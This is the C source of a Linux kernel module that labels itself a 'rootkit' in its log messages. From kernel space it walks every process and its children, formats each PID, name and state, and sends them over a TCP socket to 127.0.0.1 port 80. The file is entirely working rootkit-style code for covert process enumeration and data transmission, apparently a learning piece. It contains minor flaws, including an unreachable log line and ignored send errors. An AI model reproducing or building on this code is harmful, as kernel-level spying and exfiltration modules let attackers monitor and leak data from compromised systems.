#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/inet.h>
#include <linux/net.h>
#include <linux/uio.h>
#include <net/sock.h>

#define PORT_80 80

struct task_struct *task;
struct task_struct *task_child;
struct list_head *list;

static struct socket *sock = NULL;
//iterating through process to get process data and store it into buffor pdata
int iterate(void)
{
	void send_message(const char *strFrom);

	char pdata[700];
	int tcp_send(struct socket * sock, const char *buf, const size_t length,
		     unsigned long flags);

	memset(&pdata, 0, 700);
	preempt_disable();

	for_each_process(task) {
		snprintf(pdata, 700, "P: %d, N: %s, S: %d \n", (int)task->pid,
			 task->comm, (int)task->state);
		send_message(pdata);
		memset(&pdata, 0, 700);

		list_for_each(list, &task->children) {
			task_child =
				list_entry(list, struct task_struct, sibling);
			snprintf(pdata, 700, "PP: %d, P: %d, N: %s, S: %d \n",
				 (int)task->pid, (int)task_child->pid,
				 task_child->comm, (int)task_child->state);
			send_message(pdata);
			memset(&pdata, 0, 700);
		}
	}
	preempt_enable();
	return 0;
}

//sending data to connected server
int tcp_send(struct socket *sock, const char *buf, const size_t length,
	     unsigned long flags)
{
	int err;
	struct msghdr m = { .msg_flags = 0 };
	struct kvec vec;

	vec.iov_base = (char *)buf;
	vec.iov_len = length;

	iov_iter_kvec((&m.msg_iter), WRITE, &vec, 1, length);
	err = sock->ops->sendmsg(sock, &m, sizeof(m));
	return 0;
}

int my_tcp_sock_init(void)
{
	int err;
	void send_message(const char *strFrom);

	struct sockaddr_in saddr;
	DECLARE_WAIT_QUEUE_HEAD(recv_wait);
	
//create socket	
	err = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
	if (err < 0) {
		return err;
		printk(KERN_INFO "rootkit: error while creating socket\n");
	}
	memset(&saddr, 0, sizeof(saddr));
//initializing fields of saddr
	saddr.sin_family = AF_INET;
	saddr.sin_port = htons(PORT_80);
	saddr.sin_addr.s_addr = in_aton("127.0.0.1");

//connecting socket
	err = sock->ops->connect(sock, (struct sockaddr *)&saddr, sizeof(saddr),
					 0);
	if (err < 0) {
		printk(KERN_INFO
		       "rootkit: error %d while connecting using conn ",
		       err);
		return err;
	}

//call iterate to get processes data 
	err = iterate();
	if (err < 0) {
		printk(KERN_INFO "rootkit: error while sending message\n");
		return err;
	}

	wait_event_timeout(recv_wait,
			   !skb_queue_empty(&sock->sk->sk_receive_queue),
			   5 * HZ);
	printk(KERN_INFO "rootkit: msg sent\n");

	sock_release(sock);
	return 0;
}
//preparing buffor with data to send it via tcp_send
void send_message(const char *strFrom)
{
	int len = 799;
	char str[800];

	memset(&str, 0, len + 1);
	strcat(str, strFrom);
	tcp_send(sock, str, strlen(str), MSG_DONTWAIT);
}
